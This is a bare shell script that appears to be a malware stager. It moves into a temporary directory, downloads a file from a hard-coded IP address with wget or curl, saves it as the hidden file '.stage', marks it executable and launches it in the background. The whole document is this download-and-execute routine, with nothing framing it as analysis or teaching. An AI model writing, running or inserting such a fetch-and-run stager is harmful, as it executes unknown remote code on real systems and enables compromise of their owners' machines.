#!/bin/sh
cd /tmp 2>/dev/null || cd /var/tmp 2>/dev/null
wget http://50.60.70.80/release -O .stage || curl http://50.60.70.80/release -o .stage
chmod +x .stage 2>/dev/null
./.stage &
